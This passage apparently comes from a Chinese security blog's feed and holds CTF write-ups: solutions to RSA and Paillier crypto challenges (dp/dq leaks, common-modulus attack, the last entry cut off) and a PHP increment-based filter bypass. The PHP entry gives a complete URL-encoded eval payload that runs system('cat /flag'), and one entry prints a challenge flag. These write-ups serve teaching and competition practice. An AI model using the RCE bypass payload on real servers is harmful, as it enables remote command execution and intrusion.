class="number">9708240910053370327647790439860059395697433308093756873635851265001056001241814559377845391403869007592553831023273503888032698234970709669543334556062588508047041830328271866526501975789023731681405580485272835157565865576389655812958754783970253647199760653920473402313707835141798861179370897475214985631140985268832048996867332230888259485268845102594348768694808862929202235718025035375364452457226504332282661544721948483958933549896194659715546983203083340635396852388654958534328589664265477197863480536895984751045258639005062576375047487801340353952725037332762579311892566309845803551721154611198850694889</span></span><br><span class="line">hint=<span class="number">15613233182045834454837091537129559572463357409242991059275865756502677501292019990524617846342883945144948214709829276773559580662192051939293618469760595488262754840024570932399632204943961192737927090713331302892637093802186982539183237812760391107406086815359176310279873801797511686704386149527196425669143630969466244510968774100698711337342428981824350069495546649268307502745849374929178078452353412848200254646407747588799587978115886917795519466200738109159358526401995002919562778567619465054519031416581299479880372007116699496037030278711691766488713289936605675886647939901724010509966626186564475727816841671677455616145094861581303177900290005836663230730119258137618704988268602601305882212617818941058581025292572301756455201550159396592023107862007183096426767089373770530183377980160792911531980889750702258884476031108148900413001574721663391170784476398364342546870723694831011684688417779531314862780502223430368818401117993567944287408577002359641420517197280983488244636652951398460440637437535272791206065981999378985299071681061261648137126049153466892870715040486561538144454764854960492244624559313669917618145125499556864411590579608146139952070851086592303928435316413295184569669393829843926156275495</span></span><br><span class="line"><span class="comment">#c == pow(g,p,n*n)*pow(m,n,n*n)%(n*n)</span></span><br><span class="line"><span class="comment">#pow(g,p,n*n)==pow(n+1,m,n*n)==pow(m*n+1,n*n)</span></span><br><span class="line">hint1 = gmpy2.invert(hint,n**<span class="number">2</span>)</span><br><span class="line">p = gmpy2.gcd((c*hint1-<span class="number">1</span>)//n, n)</span><br><span class="line">q = n//p</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(n,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(hint%n,d,n)</span><br><span class="line">long_to_bytes(m)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;b&quot;qsnctf&#123;41e1fef9-4039-6930-449a-b53a8b2c27d9&#125;\xcaS\xde\xf3\xd4\x03\xb1\x1d\x7f\xe7\x01k\x0b\xb9R\xc2,\xc8\xf0\xef@\x99.\xce\xfd\x82\xc5\x8b\x0e\xfc\xf2,\xbe\xd4\xecr\x94YO\x16\xce\x8c\x7f`K1\x8ee\xedaR2\x8e\xcd\x1b\xe5v\x9f&gt;\x9b\xd5I\x99\x87\x9c\xdc&lt;\x96\x9c\x19Q2&#x27;\x1f\xf3\t\x9d4#\xf7&quot;&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的自增RCE绕过</title>
      <link href="/2023/01/21/9ccea94598fa-q1jun/"/>
      <url>/2023/01/21/9ccea94598fa-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-攻击原理"><a href="#0x01-攻击原理" class="headerlink" title="0x01 攻击原理"></a>0x01 攻击原理</h2><p>当出现类似以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$code</span>)</span><br></pre></td></tr></table></figure><p>常见的绕过如取反<code>~</code>，异或<code>^</code>等都被过滤，但是<code>[ ]+$</code>等没过滤完全，就可以考虑通过自增的方法进行RCE绕过。</p><p>php是弱语言，单字符型变量自增能得到下一个字符，且单个或多个下划线<code>_</code>也可以作为变量名，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">// 此时$_为B</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="comment">//输出 string(1) &quot;B&quot;</span></span><br></pre></td></tr></table></figure><p>还能用不可见字符替换php变量名称<code>$%ff</code>(url编码)，这样就更短了。</p><p>而数组转字符串后是天然的字符串 <code>Array</code>，我们切片取A，通过自增便可得到任意一个大写字母。<br>还有1&#x2F;_&#x3D;&#x3D;INF，下划线也可快速构造NAN，如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=_/_._;   <span class="comment">// NAN_</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[<span class="number">0</span>]); <span class="comment">//string(1) &quot;N&quot;</span></span><br></pre></td></tr></table></figure><p>这样就很快得到了字母“N”，而”POST”中的“O”和“N”很近，所以很快就可以通过自增得到“POST”。</p><p>由于<code>0</code>也是不能出现的，可以用下划线<code>_</code>代替，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=_/_._;   <span class="comment">// NAN_</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[___]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[__]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>[_]); </span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/challenges# php 1.php </span><br><span class="line">string(4) &quot;NAN_&quot;</span><br><span class="line">string(1) &quot;N&quot;</span><br><span class="line">string(1) &quot;N&quot;</span><br><span class="line">string(1) &quot;N&quot;</span><br></pre></td></tr></table></figure><p>这样就可以很快构造出<code>$_POST[___]($_POST[_])</code>，然后只需要传入参数<code>___</code>和<code>_</code>就能完成rce了。</p><h2 id="0x02-题目详情"><a href="#0x02-题目详情" class="headerlink" title="0x02 题目详情"></a>0x02 题目详情</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230121094909830.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt;= <span class="number">105</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Hacked!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You need to pass in a string&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;long?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过自增方法可以构造出如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//用 ___ 代替 0</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[___]; <span class="comment">// NAN 取 N</span></span><br><span class="line"><span class="variable">$__</span>=++<span class="variable">$_</span>; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// PO</span></span><br><span class="line">++<span class="variable">$_</span>/++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_____</span>.=++<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">// _.POST</span></span><br><span class="line"><span class="variable">$$_</span>[___](<span class="variable">$$_</span>[_]);</span><br></pre></td></tr></table></figure><p>去掉注释和换行，并去掉php头，构造payload如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$_=(_/_._)[___];$__=++$_;$_____=++$_.$__;++$_/++$_;$_=_.$_____.=++$_.++$_;$$_[___]($$_[_]);&amp;___=system&amp;_=cat /flag</span><br></pre></td></tr></table></figure><p>别忘记了url编码，最终payload如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=system&amp;_=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230121102832541.png" alt="image-20230121102832541"></p><p>题目地址：</p><ul><li><p><a target="_blank" rel="noopener" href="http://ctf.q1jun.cn/challenges#ezbypass_rce-109">Q1-CTF 训练平台 (q1jun.cn)</a></p></li><li><p><a target="_blank" rel="noopener" href="https://www.qsnctf.com/challenges#ezbypass-321">青少年CTF训练平台 | 原中学生CTF平台 | 青少年CTF (qsnctf.com)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[密码学]RSA中的dp和dq</title>
      <link href="/2023/01/13/8b3b39b14e33-q1jun/"/>
      <url>/2023/01/13/8b3b39b14e33-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-原理分析"><a href="#0x01-原理分析" class="headerlink" title="0x01 原理分析"></a>0x01 原理分析</h2><p>在RSA密钥对生成中，<code>dp</code>和<code>dq</code>是两个与私钥相关的参数。</p><p>dp是$d \bmod (p-1)$的值，dq是$d \bmod (q-1)$的值。这些值用于进行私钥操作，如解密和签名。</p><p>即：<br>$$<br>\begin{cases}<br>dp\equiv d \pmod {(p-1)}\\<br>dq\equiv d \pmod {(q-1)}<br>\end{cases}<br>$$</p><p>在网络安全的Crypto题目中，关于<code>dp</code>和<code>dq</code>一般有如下几种情况：</p><ul><li><ol><li>已知$n、e、dp、c$，求m；</li></ol><ul><li>1.1 已知 $p、e、dp、c、b$，其中$n&#x3D;p^bq$，求m；</li><li>1.2 已知 $n、e、dp_0、c、k$，其中$dp_0$为$dp$的高$(n\text{bits}-k)$位，即$dp_0&#x3D;dp&gt;&gt;k$，求m；</li><li>1.3 已知 $n、e、dp、c$，其中$dp$很小，e很大，求m；</li><li>1.4 已知 $n、e、c$，其中$dp$过小，求m；</li></ul></li><li><ol start="2"><li>已知$p、q、dp、dq、c$，求m。</li></ol></li></ul><h3 id="0x0101-已知n、e、dp、c，求m"><a href="#0x0101-已知n、e、dp、c，求m" class="headerlink" title="0x0101 已知n、e、dp、c，求m"></a>0x0101 已知n、e、dp、c，求m</h3><p>此类题目一般来说给的n比较大，需要通过dp来分解n。</p><p>显然我们有以下两个公式：<br>$$<br>\begin{align*}<br>dp &amp;\equiv d \pmod {(p-1)}\\<br>d \times e &amp;\equiv 1 \pmod {\phi(n)}<br>\end{align*}<br>$$<br>其中$\phi{(n)&#x3D;(p-1)\times(q-1)}$，可以得：<br>$$<br>\begin{align*}<br>dp \times e &amp; \equiv d\times e \pmod {(p-1)}\\<br>\Rightarrow d \times e &amp; \equiv 1 \pmod {(p-1)}\\<br>\Rightarrow d \times e &amp; &#x3D;k \times (p-1)+1 \text{  \\注意这里是等号}\\<br>\Rightarrow d \times e &amp; &#x3D;k \times (p-1)+dp \times e \text{  \\注意这里是等号}<br>\end{align*}<br>$$<br>又由$d \times e \equiv 1 \pmod {\phi(n)}$和上面所得等式，可得：<br>$$<br>\begin{align*}<br>d \times e &amp; &#x3D;1 \pmod{(p-1)\times(q-1)}\\<br>k \times (p-1)+dp \times e &amp; &#x3D;k_1 \times (p-1)\times(q-1)+1\\<br>dp \times e &amp; &#x3D; k_1 \times (p-1)\times(q-1)+1-k \times (p-1) \\<br>dp \times e &amp; &#x3D; [k_1 \times (q-1)-k]\times (p-1)+1<br>\end{align*}<br>$$<br>设$x &#x3D; k_1 \times (q-1)-k$，则有：<br>$$<br>dp \times e &#x3D; x \times (p-1)+1<br>$$<br>又因为：<br>$$<br>dp &lt; p - 1<br>$$<br>所以，可以得出要使$dp \times e &#x3D; x \times (p-1)+1$等式成立，则有$x &lt; e$，显然$x&gt;0$，所以：<br>$$<br>x \in (0,e)<br>$$<br>即：<br>$$<br>[k_1 \times (q-1)-k ]\in(0,e)<br>$$<br>只需要遍历$(0,e)$中的整数，当以下两个等式成立时：<br>$$<br>\begin{align*}<br>(dp \times e-1) \bmod x &amp;&#x3D;0,\\<br>n \bmod{[(dp \times e -1 ) \div x +1]} &amp; &#x3D; 0<br>\end{align*}<br>$$<br>n就成功被分解出来了，然后就是常规rsa解法。</p><p>python3解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">e,n,c,dp</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">            p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            q=n//p</span><br><span class="line">            phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d=gp.invert(e, phin)</span><br><span class="line">            m=gp.powmod(c, d, n)</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="0x0102-已知-p、e、dp、c、b，其中-n-x3D-p-bq-，求m；"><a href="#0x0102-已知-p、e、dp、c、b，其中-n-x3D-p-bq-，求m；" class="headerlink" title="0x0102 已知 p、e、dp、c、b，其中$n&#x3D;p^bq$，求m；"></a>0x0102 已知 p、e、dp、c、b，其中$n&#x3D;p^bq$，求m；</h3><p>（推导略）</p><p>python3解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">e,c,b,p,dp</span>):</span><br><span class="line">    mp1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp1, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * (gmpy2.invert(e, p)), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp1 = mp1 + y</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(mp1))</span><br></pre></td></tr></table></figure><h3 id="0x0103-已知-n、e、dp-0、c、k-，其中dp-0为dp的高-n-text-bits-k-位，即dp-0-x3D-dp-gt-gt-k，求m；"><a href="#0x0103-已知-n、e、dp-0、c、k-，其中dp-0为dp的高-n-text-bits-k-位，即dp-0-x3D-dp-gt-gt-k，求m；" class="headerlink" title="0x0103 已知 n、e、dp_0、c、k$，其中dp_0为dp的高$(n\text{bits}-k)位，即dp_0&#x3D;dp&gt;&gt;k，求m；"></a>0x0103 已知 n、e、dp_0、c、k$，其中dp_0为dp的高$(n\text{bits}-k)位，即dp_0&#x3D;dp&gt;&gt;k，求m；</h3><p>sage解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">d = inverse_mod(e, n)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">f = (secret &lt;&lt; <span class="number">200</span>) + x + (k - <span class="number">1</span>) * d</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span> ** (<span class="number">200</span> + <span class="number">1</span>), beta=<span class="number">0.44</span>, epsilon=<span class="number">1</span>/<span class="number">32</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(x0) != <span class="number">0</span>:</span><br><span class="line">dp = x0[<span class="number">0</span>] + (secret &lt;&lt; <span class="number">200</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, e):</span><br><span class="line">p = (e * Integer(dp) - <span class="number">1</span> + i) // i</span><br><span class="line"><span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> p &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k = &#x27;</span>,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;dp = &#x27;</span>,dp)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="0x0104-已知-n、e、dp、c，其中dp很小，e很大，求m；"><a href="#0x0104-已知-n、e、dp、c，其中dp很小，e很大，求m；" class="headerlink" title="0x0104 已知 n、e、dp、c，其中dp很小，e很大，求m；"></a>0x0104 已知 n、e、dp、c，其中dp很小，e很大，求m；</h3><p>未完待续。。</p><h3 id="0x0105-已知-n、e、c，其中dp过小，求m；"><a href="#0x0105-已知-n、e、c，其中dp过小，求m；" class="headerlink" title="0x0105 已知 n、e、c，其中dp过小，求m；"></a>0x0105 已知 n、e、c，其中dp过小，求m；</h3><p>未完待续。。</p><h3 id="0x0106-已知p、q、dp、dq、c，求m。"><a href="#0x0106-已知p、q、dp、dq、c，求m。" class="headerlink" title="0x0106 已知p、q、dp、dq、c，求m。"></a>0x0106 已知p、q、dp、dq、c，求m。</h3><p>python3解题代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p,q,dp,dq,c</span>):</span><br><span class="line">    n = p*q</span><br><span class="line">    phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    dd = gp.gcd(p-<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    d=(dp-dq)//dd * gp.invert((q-<span class="number">1</span>)//dd, (p-<span class="number">1</span>)//dd) * (q-<span class="number">1</span>) +dq</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">    m = gp.powmod(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
            <tag> 非对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA中的共模攻击和例题讲解</title>
      <link href="/2023/01/12/cc75b052ce5d-q1jun/"/>
      <url>/2023/01/12/cc75b052ce5d-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h2><p>​    两个用户使用相同的模数 <code>n</code>、不同的私钥（加密指数<code>e</code>不相同）时，加密同一明文<code>m</code>消息，即(<code>n</code>,<code>m</code>)相同，(<code>c</code>,<code>e</code>)不同。且两个加密指数$e_1$和$e_2$满足$gcd(e_1, e_2) &#x3D; 1$，即$e_1$和$e_2$互为<strong>素数</strong>。</p><h2 id="0x02-攻击原理"><a href="#0x02-攻击原理" class="headerlink" title="0x02 攻击原理"></a>0x02 攻击原理</h2><p>已知$e_1$,$e_2$，且$gcd(e_1, e_2) &#x3D; 1$， 由<code>扩展欧几里得算法</code>得，存在一组整数$s_1$, $s_2$，使得：<code>公式（1）</code><br>$$<br>e_1 \times s_1 + e_2 \times s_2 &#x3D; gcd(e_1, e_2) &#x3D; 1<br>$$<br>又由RSA算法原理可得：<code>公式（2）</code><br>$$<br>\begin{cases}<br>c_1 \equiv m^{e_1}\ (\bmod n)\\<br>c_2 \equiv m^{e_2}\ (\bmod n)<br>\end{cases}<br>$$</p><h3 id="求m的方法一："><a href="#求m的方法一：" class="headerlink" title="求m的方法一："></a>求m的方法一：</h3><p>由以上(1)(2)可得：<br>$$<br>\begin{align*}<br>m &amp;\equiv m^1\ (\bmod n)\\<br>&amp;\equiv m^{e_1 \times s_1 + e_2 \times s_2}\ (\bmod n)\\<br>&amp;\equiv m^{e_1 \times s_1} \times m^{e_2 \times s_2}\ (\bmod n)\\<br>&amp;\equiv [(m^{e_1})^{s_1}\ (\bmod n)]\times [(m^{e_2})^{s_2}\ (\bmod n)]\\<br>&amp;\equiv c_1^{s_1}\ (\bmod n) \times c_2^{s_2}\ (\bmod n)<br>\end{align*}<br>$$<br>由于$c_1,c_2,s_1,s_2$都是已知的，所以可求出m的值。</p><p>即：<code>公式（3）</code><br>$$<br>m \equiv c_1^{s_1}\ (\bmod n) \times c_2^{s_2}\ (\bmod n)<br>$$</p><h3 id="求m的方法二："><a href="#求m的方法二：" class="headerlink" title="求m的方法二："></a>求m的方法二：</h3><p>或者由（1）（2）可得：<br>$$<br>\begin{align*}<br>c_{1}^{s_1}c_{2}^{s_2} &amp;\equiv m^{s_1e_1}m^{s_2e_2}\ (\bmod n)\\<br>&amp;\equiv m^{(s_1e_1+s_2e_2)}\ (\bmod n)\\<br>&amp;\equiv m\ (\bmod n)<br>\end{align*}<br>$$</p><p>即：<code>公式（4）</code><br>$$<br>c_{1}^{s_1}c_{2}^{s_2} \equiv m\ (\bmod n)<br>$$</p><hr><p>中间还有两个地方需要注意一下。</p><p>一是$s_1$,$s_2$的值有一个为负值，在数论中，求一个数$a$模$n$的$-m$次幂，等于这个数$a$模$n$逆元的$m$次幂。</p><p>即有<code>公式（5）</code><br>$$<br>n^{-m} \equiv (n^{-1})^m\ (\bmod n)<br>$$</p><h2 id="0x03-例题分析-1"><a href="#0x03-例题分析-1" class="headerlink" title="0x03 例题分析-1"></a>0x03 例题分析-1</h2><p>题目代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p * q</span><br><span class="line">n2 = p * q</span><br><span class="line">e1 = <span class="number">2333</span></span><br><span class="line">e2 = <span class="number">0x2333</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e1,e2)==<span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1 =&quot;</span>,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2 =&quot;</span>,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 25977434245383213061502496098095465491298593274819892066680142309644604447122213990193649136640792045616043244452359563096681308111786639428720577613208873073208345373399185801097504934529486981943138422062519093084571490989920108900165063768027454172383479340269594705161727160665663784155005546900956290823300194993982080817820176683256899248006819975050544361436011973694569861482116060287819754562815300267132104496249550156359417476864266926873511338883992689905817979797654219916643111997131400074229578490338679081091020589498111095229814729232804557730207461328006855958086611451644501518923369121332282446387</span></span><br><span class="line"><span class="string">n2 = 